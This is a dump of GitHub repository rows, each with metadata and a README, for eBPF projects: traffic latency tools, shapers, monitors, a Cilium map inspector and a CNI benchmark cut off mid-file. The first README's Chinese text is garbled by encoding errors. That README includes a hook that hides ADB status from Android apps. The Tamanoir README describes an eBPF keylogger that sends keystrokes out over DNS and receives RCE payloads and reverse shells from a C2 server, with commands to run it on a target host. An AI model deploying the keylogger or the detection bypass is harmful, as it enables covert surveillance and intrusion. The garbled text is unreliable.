- åœ¨ `user.c` ä¸­ç¼–å†™ä½ çš„ eBPF æ¨¡å—ã€‚å¯ä»¥ä½¿ç”¨ç»™å®šçš„å°è£…ï¼ˆè¯¦è§â€œAPIâ€èŠ‚ï¼‰ï¼Œä¹Ÿå¯ä»¥ç”¨ä»»æ„çš„ eBPF API æ¥åšæ“ä½œï¼Œè¯¦è§ [eBPF Docs](https://docs.ebpf.io/)ã€‚

  ```c++
  struct data_t {
      int a;
      char b;
  };
  VARIABLES_POOL(data_t);
  
  static __always_inline void onEnter(struct pt_regs* ctx) {
      SET(a, 1);
      SET(b, 'c');
  }
  
  static __always_inline void onLeave(struct pt_regs* ctx) {
      char s = GET(b);
      LOG(&s, 1);
  }
  ```

- å¦‚æžœéœ€è¦ï¼Œåœ¨ `listener.go` ä¸­ç¼–å†™æ•°æ®å¤„ç†å‡½æ•°ã€‚

  ```go
  func OnEvent(cpu int, data []byte, perfmap *manager.PerfMap, manager *manager.Manager) {
  	// Write your data handler here
      fmt.Printf(""%s\n"", data)
  }
  ```

## ðŸ’­ API

- `VARIABLES_POOL` å®šä¹‰å…¨å±€å˜é‡æ± ï¼Œå¯ä»¥å°†éœ€è¦å…¨å±€å…±äº«çš„å˜é‡æˆ–å¤ªå¤§çš„å˜é‡æ”¾å…¥è¿™ä¸ªæ± å­ã€‚

  ```c++
  struct data_t {
      int a;
      char b;
  };
  VARIABLES_POOL(data_t);
  ```

- `GET(name)`ï¼šä»Žå…¨å±€å˜é‡æ± èŽ·å–å˜é‡ï¼Œç­‰åŒäºŽ  data->nameã€‚

  ```c++
  int a = GET(a);
  __builtin_memcpy(GET(b), ""xxxxx"", 5);
  ```

- `SET(name, var)`ï¼šè®¾ç½®å˜é‡ï¼Œç­‰åŒä¸Ž data->name = var; å­—ç¬¦ä¸²å˜é‡è¯·ä½¿ç”¨ GET è®¾ç½®ã€‚

- `READ_KERN(x)`ï¼šè¯»å–éžç”¨æˆ·ç©ºé—´å˜é‡ï¼Œå¦‚ `READ_KERN(ctx->regs[0])`ã€‚

- `READ(ptr, len)`ï¼šè¯»æŒ‡å®šçš„ç”¨æˆ·ç©ºé—´åœ°å€ã€‚

- `WRITE(ptr, content)`ï¼šå†™æŒ‡å®šçš„ç”¨æˆ·ç©ºé—´åœ°å€ï¼ˆç›®æ ‡åœ°å€å¿…é¡»å¯å†™ï¼‰ã€‚

- `LOG(char*, len)`ï¼šè¾“å‡ºåˆ°æŽ§åˆ¶å°ã€‚

- `SUBMIT(void*, len)`ï¼šæäº¤æ•°æ®åˆ° `listen.go` çš„ `OnEvent` å‡½æ•°ã€‚

## ðŸ§‘â€ðŸ’» ç¤ºä¾‹

ä»¥ä¸‹æ˜¯ä¸€ä¸ªç»•è¿‡ adb çš„ property æ£€æŸ¥çš„ç®€å•ç¤ºä¾‹ï¼š

```go
// config.go
const PackageName = ""com.android.myapplication""
const LibraryName = ""libc.so""
const Enter_Offset = 0xAFF44 //__system_property_get
const Leave_Offset = 0x9C158
```

```c++
// user.c
#include ""include/eHook.h""

struct data_t {
    __u64 X1;
};
VARIABLES_POOL(data_t);

static __always_inline void onEnter(struct pt_regs* ctx) {
    // Do not modify the name of 'onEnter' 'onLeave' or 'ctx'
    __u64 prop_name_addr = READ_KERN(ctx->regs[0]);
    char* s = READ(prop_name_addr, 14);
    if(!__builtin_memcmp(s, ""init.svc.adbd"", 14)) {
        SET(X1, READ_KERN(ctx->regs[1]));
    } else {
        SET(X1, 0);
    }

}
static __always_inline void onLeave(struct pt_regs* ctx) {
    if(GET(X1) != 0) {
        LOG(""modified.\n"", 10);
        WRITE(GET(X1), ""stopped"");
    }
}
```

## âš ï¸ æ³¨æ„

- eBPF å‡½æ•°ç¼–å†™æœ‰ä¸€äº›ä¸¥æ ¼çš„é™åˆ¶ï¼Œå¦‚ä¸èƒ½ä½¿ç”¨ libc ç­‰ï¼Œè¯·è‡ªè¡Œäº†è§£ã€‚
- `Packagename` å‚æ•°åªç”¨äºŽå®šä½åº“ï¼Œå¦‚æžœ hook libc ç­‰ç³»ç»Ÿåº“å°†ä¼šå¯¹æ‰€æœ‰è¿›ç¨‹ç”Ÿæ•ˆã€‚

## ðŸ›« æž„å»º

1. çŽ¯å¢ƒå‡†å¤‡

   æœ¬é¡¹ç›®åœ¨ x86 Linux ä¸‹äº¤å‰ç¼–è¯‘

   ```shell
   sudo apt-get update
   sudo apt-get install golang-1.18
   sudo apt-get install clang-15
   export GOPROXY=https://goproxy.cn,direct
   export GO111MODULE=on
   
   git clone --recursive https://github.com/ShinoLeah/eHook.git
   ./build_env.sh
   ```

2. ç¼–è¯‘è¿è¡Œ

   ```shell
   make
   ```

   å¯ä»¥åœ¨ Makefile ä¸­æŒ‡å®šé¡¹ç›®åç§°ï¼Œäº§ç‰©åœ¨ `bin/` ç›®å½•ä¸‹.
   ```shell
   adb push bin/eHook_Untitled /data/local/tmp
   adb shell
   su
   cd /data/local/tmp
   chmod +x eHook_Untitled
   ./eHook_Untitled
   ```

## â¤ï¸â€ðŸ©¹ å…¶ä»–

- å–œæ¬¢çš„è¯å¯ä»¥ç‚¹ç‚¹å³ä¸Šè§’ Star ðŸŒŸ
- æ¬¢è¿Žæå‡º Issue æˆ– PRï¼"
pouriyajamshidi/flat,76,5,76,1,C,Measure UDP  and TCP connection latency for IPv4 and IPv6 using eBPF and Go,2023-04-23T18:05:21Z,2025-10-06T19:02:11Z,217,"# flat

Measure **UDP** and **TCP** flow latency for both **IPv4** and **IPv6** using `eBPF`.

This repo is the companion to my blog posts about eBPF at <https://thegraynode.io/tags/flat/>.

![flat in action](.images/flat.gif)

## Running The Program

You can install **flat** in two ways.

1. Download the [pre-compiled binary](#download-the-pre-compiled-binary)
2. Compile from [source](#compile-from-source)

### Download The Pre-compiled Binary

Download and unpack the binary with the default garbage collection algorithm:

```bash
wget https://github.com/pouriyajamshidi/flat/releases/latest/download/flat.tar.gz
tar xvf flat.tar.gz
```

Or with the new `green tea` garbage collection algorithm:

```bash
wget https://github.com/pouriyajamshidi/flat/releases/latest/download/flat-greenteagc.tar.gz
tar xvf flat-greenteagc.tar.gz
```

Then check out the [examples](#examples).

### Compile From Source

Clone the repository:

```bash
git clone https://github.com/pouriyajamshidi/flat .
```

Change directory to `flat`:

```bash
cd flat
```

> [!TIP]
> Simply run `make` and you will have **all** you need. If you do not want to use `make`, keep on reading.

While at the root of project directory, to compile the **C** code and generate the helper functions, run:

```bash
go generate ./...
```

Compile the **Go** program:

```bash
go build -ldflags ""-s -w"" -o flat cmd/flat.go
```

### Examples

Run it with elevated privileges:

```bash
# Replace eth0 with your desired interface name
sudo ./flat -i eth0
# Or
sudo ./flat -i eth0 -ip 1.1.1.1
# Or
sudo ./flat -i eth0 -port 53
# Or
sudo ./flat -i eth0 -ip 1.1.1.1 -port 53
```

## Flags

**flat** supports four flags at the moment:

| flag  | Description                         |
| ----- | ----------------------------------- |
| -i    | interface to attach the probe to    |
| -ip   | IP address to filter on (optional)  |
| -port | Port number to filter on (optional) |
| -h    | Show help message                   |

---

## Acknowledgments

Heavily inspired by [flowlat](https://github.com/markpash/flowlat).
"
leodido/traffico,80,3,80,9,C,Shape your traffic the BPF way,2022-05-24T13:43:02Z,2025-10-10T14:22:22Z,82,"                  _   _
                 | | | | o
 _|_  ,_    __,  | | | |     __   __
  |  /  |  /  |  |/  |/  |  /    /  \_
  |_/   |_/\_/|_/|__/|__/|_/\___/\__/
                 |\  |\
                 |/  |/

README

    traffico is a collection of tools to shape traffic on a network using traffic control tc(8).
    It can be used via a CLI tool (traffico) or as a CNI plugin (traffico-cni).
    For a list of the available programs and what they do see the BUILT-IN PROGRAMS section.

    The BUILT-IN PROGRAMS are very opinionated and made for the needs of the authors but the framework
    is flexible enough to be used for other purposes. You can add programs to the bpf/ directory
    to extend it to other use cases.

CONTACT

    If you have problems, question, ideas or suggestions, please contact us by
    posting to https://github.com/leodido/traffico/issues.

DOWNLOAD

    To download the very latest source do this:

    git clone https://github.com/leodido/traffico.git

AUTHORS

    Leonardo Di Donato
    Lorenzo Fontana

USAGE

    Traffico can be either used standalone or as a CNI plugin.

    traffico
        traffico is a CLI tool that can be used to load and unload the programs.
        You can choose an interface and choose whether the program will be loaded in
        ""INGRESS"" or ""EGRESS"".

        Example usage:
            traffico --ifname=eth0 --at=INGRESS block_private_ipv4

    traffico-cni
        traffico-cni is a meta CNI plugin that allows the traffico programs to be used in CNI.

        Meta means that traffic-cni does not create any interface for you,
        it is intended to be used as a chained CNI plugin.

        The plugin block to use traffico-cni is very similar to how traffico is
        used as a CLI tool.

        {
            ""type"": ""traffico-cni"",
            ""program"": ""block_private_ipv4"",
            ""attachPoint"": ""ingress""
        }

        Here's an example CNI config file featuring traffico-cni.

        {
            ""name"": ""mynetwork"",
            ""cniVersion"": ""0.4.0"",
            ""plugins"": [
                {
                    ""type"": ""ptp"",
                    ""ipMasq"": true,
                    ""ipam"": {
                        ""type"": ""host-local"",
                        ""subnet"": ""10.10.10.0/24"",
                        ""resolvConf"": ""/etc/resolv.conf"",
                        ""routes"": [
                            { ""dst"": ""0.0.0.0/0"" }
                        ]
                    },
                    ""dns"": {
                        ""nameservers"": [""1.1.1.1"", ""1.0.0.1""]
                    }
                },
                {
                    ""type"": ""firewall""
                },
                {
                    ""type"": ""traffico-cni"",
                    ""program"": ""block_private_ipv4"",
                    ""attachPoint"": ""ingress""
                },
                {
                    ""type"": ""tc-redirect-tap""
                }
            ]
        }

BUILT-IN PROGRAMS

    block_private_ipv4
        block_private_ipv4 is a program that can be used to block
        private IPv4 addresses subnets allowing only SSH access on port 22.

    block_ip
        block_ip is a program that drops packets with destination equal to the
        input IPv4 address.

    block_port
        block_port is a program that drops packets with the destination port
        equal to the input port number.

    nop
        nop is a simple program that does nothing.

BUILD

    To compile traffico from source you either provide your `vmlinux.h` in the
    `vmlinux/` directory (default option) or you configure the project to
    generate one from your current Linux kernel:

    xmake f --generate-vmlinux=y

    Now you will be able to build traffico from source by running:

    xmake

    In case you only want to compile the BPF programs you can do this:

    xmake -b bpf

TEST

    To run the test suite you can do this:

    xmake -b test
    xmake run test
"
nouseforaname/bpf-hole,7,0,7,0,Rust,An eBPF experiment,2025-04-10T13:11:59Z,2025-08-05T03:22:13Z,30,"# bpf-hole

## what am I looking at?

This attempts to reimplement pi-hole dns block as an eBPF program. It's doing packet inspection on udp traffic via TC (traffic / transmission control). If a `bad` hostname is detected, it will redirect the packet to localhost.
It then uses a `XDP` program to drop the traffic of the redirected packet. Technically the XDP part is not necessary because we could stop the packet to ever egress the interface within the TC context. But this way we have been able to also try routing via eBPF.

## Why?

To understand eBPF and what it can do or won't. I don't think DNS packet inspection is a great usecase, but it is one that I can use to understand
how to write eBPF programs. This should probably not be running on anyones system but if you're feeling adventurous: `gl & hf` (You could just put a static hosts config on your system instead).

But that's no fun is it.

## Run it?
export BPF_HOLE_IFACE=< your interface of choice for filtering packets >
if you're using `nix`:

start bpf-hole
```shell
nix run
```

additional nix helpers:

```shell
# dump loopback iface to debug the redirected dns requests
nix run .#dump_lo

```

## known limitations

### no support for filtering dnsoverhttps
it seems to be possible to do this though. We do not even need to care about decrypting the traffic:

see: https://github.com/gojue/ecapture

# the below are the auto generated docs by the aya template and will tell you how to run with your system rust.

## Prerequisites

1. stable rust toolchains: `rustup toolchain install stable`
1. nightly rust toolchains: `rustup toolchain install nightly --component rust-src`
1. (if cross-compiling) rustup target: `rustup target add ${ARCH}-unknown-linux-musl`
1. (if cross-compiling) LLVM: (e.g.) `brew install llvm` (on macOS)
1. (if cross-compiling) C toolchain: (e.g.) [`brew install filosottile/musl-cross/musl-cross`](https://github.com/FiloSottile/homebrew-musl-cross) (on macOS)
1. bpf-linker: `cargo install bpf-linker` (`--no-default-features` on macOS)

## Build & Run

Use `cargo build`, `cargo check`, etc. as normal. Run your program with:

```shell
cargo run --release --config 'target.""cfg(all())"".runner=""sudo -E""'
```

Cargo build scripts are used to automatically build the eBPF correctly and include it in the
program.

## Cross-compiling on macOS

Cross compilation should work on both Intel and Apple Silicon Macs.

```shell
CC=${ARCH}-linux-musl-gcc cargo build --package bpf-hole --release \
  --target=${ARCH}-unknown-linux-musl \
  --config=target.${ARCH}-unknown-linux-musl.linker=\""${ARCH}-linux-musl-gcc\""
```
The cross-compiled program `target/${ARCH}-unknown-linux-musl/release/bpf-hole` can be
copied to a Linux server or VM and run there.
"
containerscrew/csp,2,0,2,1,Rust,A Lightweight eBPF tool to monitor Podman egress traffic via cgroup egress hook (cgroup/skb) ðŸ,2025-04-23T09:21:04Z,2025-06-09T12:13:02Z,13,"# csp (Container Snoop) ðŸ

_A Lightweight eBPF tool to monitor Podman egress traffic via cgroup egress hook (cgroup/skb)_

> This demo could easily be extended to sniff traffic from container runtimes like containerd or others.

---

> For the demo, only `IPv4` traffic has been implemented for now.

# Introduction

After installing `podman` in your computer, run:

```shell
systemctl --user enable --now podman.socket
ls -l /run/user/$(id -u)/podman/podman.sock
```

By default will use `/run/user/1000/podman/podman.sock`. If you have other path, change it in `csp/src/podman.rs`.

> `I personally use Fedora 42, with kernel version 6.14.3-300.fc42.x86_64.`

Install rust:

```shell
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
rustup install stable && rustup toolchain install nightly --component rust-src
rustup default nightly
cargo install bpf-linker
```

# Usage

```shell
cargo run --release --config 'target.""cfg(all())"".runner=""sudo -E""' --
# Or compile the binary
cargo build --release
sudo ./target/release/csp
```

# Demo

![demo](./demo.png)

```shell
podman run --rm -itd --name ubuntu docker.io/ubuntu:latest
podman exec -it ubuntu bash
root@357d0bc39708: curl https://google.com &> /dev/null
```
"
SamuelVedel/kerpad,2,0,2,0,C,Touchpad edge motion,2025-04-08T12:14:27Z,2025-09-19T19:49:53Z,113,"# Kerpad

This program implements a customizable edge motion to make your mouse move automatically while touching the edge of your touchpad.

To do that, this program finds and listens to a `/dev/input/eventXX` file and simulates a mouse for the movement.

This program was made to work on Linux. It might work on other Unix-like operating systems, but there is no warranty.

This program does not support the multi-touch protocol yet.

The first version of this program used eBPF to work, but it was overkill and consumed more CPU cycles. If you are curious, you can still find this version on the ebpf branch of this repo.

## How to use it

### Dependencies

To compile, this program depends on:
 - gcc
 - make
 - pandoc (only if you want the man page)

### Compile and run it

Once you have all the required dependencies, you can compile it with the command:
```
make
```
And run it with the command:
```
sudo ./kerpad
```

While the program is running, you can stop it by typing `CTRL-C`. After typing `CTRL-C`, you have to touch the touchpad one last time for the program to stop.

By default, the edge motion only works when the touchpad is pressed or when you double tap it. But you can have edge motion while touching it if you run:
```
sudo ./kerpad -a
```

By default, this program will try to find the device that looks the most like a touchpad, but you can tell it to listen to a specific device with:
```
sudo ./kerpad -n <device_name>
```

### Edge scrolling

Kerpad also provide edge scrolling. Edge scrolling makes the touchpad scroll when you are moving your finger at the edge of it. It is disabled by default, but you can enable it with the `--edge-scrolling` option. There are options to choose  which edge is used for scrolling, see `kerpad --help` or `man kerpad` for more details.

### Make it run at boot time

If you want this program to run at system boot, you can run:
```
make install
sudo systemctl daemon-reload
sudo systemctl enable kerpad.service
```
This will install and enable a systemd service for Kerpad. `make install` will also intall the `kerpad` command, the bash completion script and the man page if you have pandoc installed.

If you want to use additional `kerpad` options for the service, you can do:
```
make kerpad.service KERPAD_ARGS='<args>'
```
before the previous commands (you may have to remove `kerpad.service` if it already exists).

You can change the template for `kerpad.service` by editing `kerpad.service.template`.

### Uninstall it

If you don't want to use Kerpad anymore, you can uninstall it with the command:
```
make uninstall
```

## How to configure it

### Configure the edge limits

The edge limits are the boundaries on the touchpad beyond which the mouse will start to move automatically. By default, those limits are determined by the dimensions of the detected device. However, if you don't like the default values, you can easily change the edge thickness or directly set the limit values using `kerpad` options. See:
```
kerpad -h
```
or
```
man kerpad
```

To determine which edge limits work best for you, you can run:
```
sudo kerpad -va
```
This will display the coordinates on the touchpad while you touch it.

### Configure the mouse speed

When edge motion is triggered, the mouse will move one pixel each sleep time microseconds. By default, the sleep time is `3000`, but you can change it with the `-s` option. The sleep time is slightly longer when touching a corner.

### Configure the scroll speed

When edge scrolling is applied, the number of detents is divided by a value. To configure the scroll speed you can change this value with the `--scroll-div` option, if the value is lower, the scroll will be faster and if the value is higher, the scroll will be slower. A negative value can be given to reverse the scroll direction.
"
gotoolkits/lightmon,15,1,15,0,C,"lightmon is a lightweight, Docker/K8s container-aware network traffic monitoring tool based on eBPF technology.",2025-04-19T01:34:15Z,2025-05-16T10:55:19Z,12,"# lightmon

lightmon is a lightweight, Docker/K8s container-aware network traffic monitoring tool based on eBPF technology. It can capture and analyze network connections established by host and container applications in real-time, providing monitoring data in multiple formats. Suitable for system monitoring, security auditing, and network troubleshooting scenarios.

## DeepWiki Docs
[DeepWiki Docs](https://deepwiki.com/gotoolkits/lightmon) 

## Architecture Overview

```
+---------------------+
|   User-space Program |
|  (Implemented in Go) |
+----------+----------+
           |
           | via perf buffer
           |
+----------v----------+
|   eBPF Program      |
|  (Implemented in C) |
|   - Trace syscalls  |
|   - Filter network events |
+---------------------+
```

## Features

- **Lightweight & Efficient**: Based on eBPF technology with minimal performance overhead
- **Comprehensive Monitoring**: Tracks TCP connection information
- **Container-Aware**: Automatically identifies K8s/Docker container environments
- **Process-Aware**: Automatically identifies processes associated with traffic and their executable paths
- **Flexible Filtering**: Supports multi-condition combined filtering rules
- **Multiple Output Formats**: Supports log files, JSON, tables and other output formats

## Installation Guide

### Dependencies

```sh
# Basic dependencies
sudo apt update
sudo apt install -y llvm clang

# Go environment (recommended 1.23+)
```

### Build & Install

```sh
git clone https://github.com/gotoolkits/lightmon.git
cd lightmon

go mod tidy
make build
```

## Usage

### Basic Usage

```sh
# Specify config file
bin/amd64/lightmon -c ./config.yaml
bin/arm64/lightmon -c ./config.yaml

# Run with default configuration
bin/amd64/lightmon
bin/arm64/lightmon

```

### Output Formats

lightmon supports multiple output formats ('-f'):

1. **LOG format** (default)
   ```
   [container] [dest IP] [dest port] [protocol] [level] [message] [PID] [process args] [process name] [src ip] [src port] [time] [user]
   {""conatiner"":""dreamy_carson"",""dip"":""183.2.172.17"",""dport"":""65535"",""ipv6"":0,""level"":""info"",""msg"":"""",""pid"":""501750"",""procArgs"":""www.baidu.com"",""procPath"":""/usr/bin/busybox"",""sip"":""10.1.8.14"",""sport"":""7825"",""time"":""2025-04-17T14:01:48+08:00"",""user"":""root""}
   ```

2. **JSON format** (use `-output json`)
   ```json
   {
     ""kernelTime"": ""13898485459656"",
     ""goTime"":""2025-04-17T14:09:49.162027869+08:00"",
     ""pid"": 1234,
     ""comm"": ""nginx"",
     ""addressFamily"": ""AF_INET"",
     ""saddr"": ""192.168.1.100"",
     ""sport"": 34567,
     ""daddr"": ""10.0.0.1"", 
     ""dport"": 80,
     ""container"":""web-server"",
   }
   ```

3. **Table format** (use `-output table`)
   ```
   +----------+-------+-------+------+-----------------+-----------------+--------------+------------------------+
   | TIME     | USER  | PID   | AF   |  SRC            | DEST            | CONTAINER    |     PROCESS            |
   +----------+-------+-------+------+-----------------+-----------------+---------------------------------------+
   | 14:05:56 | root  | 1234  | v4   | 10.4.0.16:3425  | 10.0.0.1:80     | web-server   | /usr/local/bin/python  |
   +----------+-------+-------+------+-----------------+-----------------+---------------------------------------+
   ```

### Filtering

Use `-exclude` parameter to exclude unwanted connections:

```sh
# Exclude traffic to specific ports
./lightmon -exclude 'dport=80'

# Exclude traffic to specific IP ranges
./lightmon -exclude 'dip=""192.168.1.0/24""'

# Combined conditions
./lightmon -exclude 'dport=80;dip=""192.168.1.1"";keyword=""nginx""'
```

#### Filter Syntax

- **Basic conditions**:
  - `dport=port` - Filter by destination port
  - `dip='IP/CIDR'` - Filter by destination IP
  - `keyword='string'` - Filter by process path/name
  - `container='string'` - Filter by container name

- **Logical operators**:
  - `&&` - AND logic
  - `||` - OR logic
  - `;` - Condition group separator

#### Filter Examples

1. Exclude local network and DNS traffic:
   ```sh
   ./lightmon -exclude 'dip=""192.168.1.0/24"";dport=53'
   ```

2. Exclude specific services:
   ```sh
   ./lightmon -exclude 'keyword=""nginx"";keyword=""mysql""'
   ```

3. Complex condition combinations:
   ```sh
   ./lightmon -exclude 'dip=""10.0.0.1"" && dport=80; dip=""10.0.0.1"" && dport=443'
   ```

4. Exclude traffic from containers with specific names:
   ```sh
   ./lightmon -exclude 'container=""nginx"";container=""redis""'
   ```

## Development Guide

### Code Structure

```
lightmon/
â”œâ”€â”€ conv/          # Protocol conversion
â”œâ”€â”€ dockerinfo/    # Container info processing
â”œâ”€â”€ event/         # Event type definitions
â”œâ”€â”€ filter/        # Filtering logic
â”œâ”€â”€ headers/       # eBPF headers
â”œâ”€â”€ linux/         # Linux-specific functions
â”œâ”€â”€ outputer/      # Output handlers
â”œâ”€â”€ fentryTcpConnectSrc.c # Fentry eBPF program type 
â”œâ”€â”€ sysEnterConnectSrc.c  # Tracepoint eBPF program
â””â”€â”€ main.go        # Program entry
```

### Build & Test

```sh
# Run unit tests
go test ./...

# Build binary
make build

# Clean build
make clean
```

## Contributing

Issues and PRs are welcome. Contribution process follows standard GitHub workflow.

## License

Apache License 2.0, see LICENSE.txt file for details."
adgaultier/tamanoir,299,25,299,2,Rust,An eBPFðŸ Keylogger with C2-based RCE payload delivery,2024-10-19T20:34:40Z,2025-10-06T09:02:51Z,22,"<div align=""center"">
  <h1>Tamanoir</h1>
  <h3>An eBPFðŸ Keylogger with <br>C2-based RCE payload delivery</h3>
  <img src=""https://github.com/user-attachments/assets/47b8a0ef-6a52-4e2d-8188-e77bb9e98d79"" style=""width: 30%; height: auto;"">
  <p><small><i>A large anteater of Central and South America, Myrmecophaga tridactyla</i></small></p>
</div>

#### âš¡ Powered by [Aya](https://aya-rs.dev), [Tokio](https://github.com/tokio-rs/tokio),  [Tonic](https://github.com/hyperium/tonic) and [Ratatui](https://ratatui.rs)

## ðŸ’¡Overview

Tamanoir is structured around 3 components: 

### 1. Tamanoir
An eBPF program running on a target host, it will act as a keylogger and extract keystrokes via DNS queries.<br> 
In DNS response, attacker can choose to send chunks of RCE payload that will be executed on targeted host.

### 2. Tamanoir-C2
The Command & Control server. It acts as a DNS proxy and can inject rce payloads in DNS response.<br> 
It also can handle reverse shell connections.

### 3. Tamanoir-tui
The TUI client communicating with C2 server. Built on top of ratatui

<div align=""center"">
  <img src=""https://github.com/user-attachments/assets/eb671b0a-9431-41b7-9d41-4a35f222a728"" style=""width: 100%; height: auto;"">
  <p><small><i>Tui client demo</i></small></p>
</div>



### Glossary
- what is [eBPF](https://ebpf.io/what-is-ebpf/)
- C2: Command and Control
- RCE: Remote Code Execution


### Documentation
Jump to:
- [Focus on Tamanoir (eBPF)](assets/doc/tamanoir.md)
- [Focus on Tamanoir-C2](assets/doc/tamanoir-c2.md)
- [Focus on Tamanoir-Tui  ](assets/doc/tamanoir-tui.md)
<br>

## Architecture
<div align=""center"">
  <img src=""https://github.com/user-attachments/assets/725c9623-ae8e-4d7e-9210-0785d5f28d6e"" style=""width:75%"">
</div>



## ðŸš€ Setup

You need a Linux based OS.

### âš’ï¸ Build from source

To build from source, make sure you have:

- [bpf-linker](https://github.com/aya-rs/bpf-linker) installed.
- [Rust](https://www.rust-lang.org/tools/install) installed with `nightly` toolchain.
- protobuf-compiler

#### 1. Build ebpf program

```
cd tamanoir-ebpf && cargo build --release
```

#### 2. Build user space program

```
cargo build -p tamanoir --release
```

#### 3. Build C2 Server

```
cargo build -p tamanoir-c2 --release
```

#### 4. Build Ratatui Client

```
cargo build -p tamanoir-tui --release
```

These commands will produce  `tamanoir`, `tamanoir-c2` and `tamanoir-tui` executables  in `target/release` that you can add to your`$PATH`

### ðŸ“¥ Binary release

You can download the pre-built binaries from the [release page](https://github.com/adgaultier/tamanoir/releases)

<br>

## ðŸª„ Usage

### Tamanoir
ðŸ–¥ï¸ on target host:
```
RUST_LOG=info sudo -E tamanoir \
              --proxy-ip <C2 server IP> \
              --hijack-ip <locally configured DNS server IP> \
              --iface <network interface name>
```

for example:

```
RUST_LOG=info sudo -E tamanoir \
              --proxy-ip 192.168.1.15 \
              --hijack-ip 8.8.8.8 \
              --iface wlan0
```



<br>

### C2 Server
ðŸ–¥ï¸ on your C2 server host:

```
sudo tamanoir-c2 start
```
> [!NOTE]
> Make sure port 53 is available

<br>

### Tui Client
ðŸ–¥ï¸ wherever you want to use the client:


```
tamanoir-tui -i  <C2 server IP> 
```
> [!NOTE]
> Make sure C2 server is reachable on port 50051

<br>





## âš ï¸ Disclaimer

`Tamanoir` is developed for educational purposes only

<br>



## âœï¸ Authors

[Adrien Gaultier](https://github.com/adgaultier)
[Badr Badri](https://github.com/pythops)

<br>

## âš–ï¸ License

GPLv3
"
kakao/kubectl-cilium,33,2,33,0,Go,A kubectl plugin to monitor Cilium BPF map pressure and detect eviction risks.,2025-05-13T22:41:07Z,2025-09-23T04:47:43Z,4,"![image](docs/capture.png)

<h1 align=""center"">kubectl-cilium</h1>

A CLI for kubernetes that helps you scan and monitor BPF map usage across all nodes managed by Cilium.
This tool is designed to help cluster administrators proactively detect and address BPF map high eviction rates, such as a large number of active connections. If any nodes are identified as being at risk and encounter network issues, Please consider increasing the `--bpf-map-dynamic-size-ratio` parameter in the Cilium configuration.

For more details, please refer to: https://github.com/cilium/cilium/pull/37747

---

## Installation

### Prerequisites

- Go 1.24.2+ (for building from source)
- Access to a Kubernetes cluster with Cilium CNI

### Install via Go

```
go install github.com/kakao/kubectl-cilium@latest
```

### Build from Source

```
make run
```

---

## Usage

### Scan BPF map usage acress all nodes

```
kubectl-cilium bpf-map-pressure
```

### Scan BPF map usage for a specific node

```
kubectl-cilium bpf-map-pressure --node <node-name>
```

### Use a custom kubeconfig

```
kubectl-cilium bpf-map-pressure --kubeconfig /path/to/kubeconfig
```

## Example output

```
kubectl-cilium bpf-map-pressure
? This command create inspector pods on all nodes to check BPF map pressure. And it may consume CPU resource (200m core limit)
Do you want to continue? Yes
Inspecting node... node-1
Inspecting node... node-2
Inspecting node... node-3
Created inspector pod: bpf-inspector-node-1
Created inspector pod: bpf-inspector-node-2
Created inspector pod: bpf-inspector-node-3
Inspecting BPF map... cilium_nodeport_neigh4 in node: node-1
Inspecting BPF map... cilium_snat_v4_external in node: node-2
Inspecting BPF map... cilium_ct_any4_global in node: node-3

STATUS      NODE        MAP                       USAGE    CURRENT/MAX
[Warning]   node-1      cilium_ct4_global         80.08%   284970/356212
[O.K.]      node-1      cilium_nodeport_neigh4    0.00%    0/356212
[O.K.]      node-1      cilium_snat_v4_external   0.47%    1686/356212
[O.K.]      node-2      cilium_nodeport_neigh4    0.00%    1/356212
[O.K.]      node-2      cilium_snat_v4_external   4.10%    14606/356212
[O.K.]      node-2      cilium_ct4_global         0.16%    571/356212
[O.K.]      node-3      cilium_nodeport_neigh4    0.00%    1/356212
[O.K.]      node-3      cilium_snat_v4_external   0.96%    3410/356212
[O.K.]      node-3      cilium_ct4_global         0.13%    446/356212

If you see [Warning] status in the output and encounter network issues,
Please consider increasing --bpf-map-dynamic-size-ratio in cilium-agent configuration.
```

## Features

- Scan BPF map usage across all nodes
- Scan SNAT map usage across all nodes or a specific node
- Custom kubeconfig support
- Clear status output with warning thresholds

---
## License
This software is licensed under the Apache 2 license, quoted below.

Copyright 2025 Kakao Corp. http://www.kakaocorp.com

Licensed under the Apache License, Version 2.0 (the ""License""); you may not use this project except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0.

Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.
"
HMoradiRad/Comparing-Cilium-and-Calico,4,1,4,0,,Evaluate and compare the network latency and throughput of Cilium and Calico as Kubernetes CNI in a cluster.,2025-05-05T14:43:55Z,2025-06-02T19:13:34Z,10,"# ðŸ”¬ Comparing Cilium and Calico as Kubernetes CNI Plugins

## ðŸ“Œ Objective

This document provides a technical comparison of **Cilium** and **Calico** as Container Network Interface (CNI) plugins in a Kubernetes cluster.  
We measure and compare their **network latency**, **throughput**, and **load balancing performance** using standard tools and test cases.

---

## ðŸ“‹ Requirements

### System Requirements
- Linux system (Ubuntu 20.04+ recommended)
- 8 GB RAM minimum
- 2+ vCPUs
- Docker installed
- `kubectl` installed
- Internet access to download container images

### Tools Used
- [kind](https://kind.sigs.k8s.io/) (Kubernetes in Docker)
- [iperf3](https://iperf.fr/) (network throughput testing)
- `ping` (latency testing)
- `wrk` or `hey` (HTTP load testing)
- `cilium` CLI
- `calico` manifests

---

## ðŸš€ Step-by-Step Setup

### âœ… Step 1: Create Kind Cluster
```bash
cat <<EOF > kind-config.yaml
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
  - role: worker
  - role: worker
networking:
  disableDefaultCNI: true
EOF
```

```bash 
kind create cluster --config kind-config.yaml 
```

âœ… Step 2: Deploy Calico CNI

```bash
kubectl apply -f https://raw.githubusercontent.com/projectcalico/calico/v3.27.0/manifests/calico.yaml
```

Wait until pods are Running:
```bash
kubectl get pods -n kube-system
```

âœ… Step 3: First test: Pod-to-Pod communication

```bash
cat <<EOF > pod-to-pod-test.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: perf-test
---
# Pod 1 - Server
apiVersion: v1
kind: Pod
metadata:
  name: test-server-same-node
  namespace: perf-test
  labels:
    app: perf-test
    test-group: group1
spec:
  containers:
  - name: iperf3-server
    image: docker.arvancloud.ir/networkstatic/iperf3
    command: [""iperf3"", ""-s""]
---
# Pod 2 - Client (Same Node)
apiVersion: v1
kind: Pod
metadata:
  name: test-client-same-node
  namespace: perf-test
  labels:
    app: perf-test
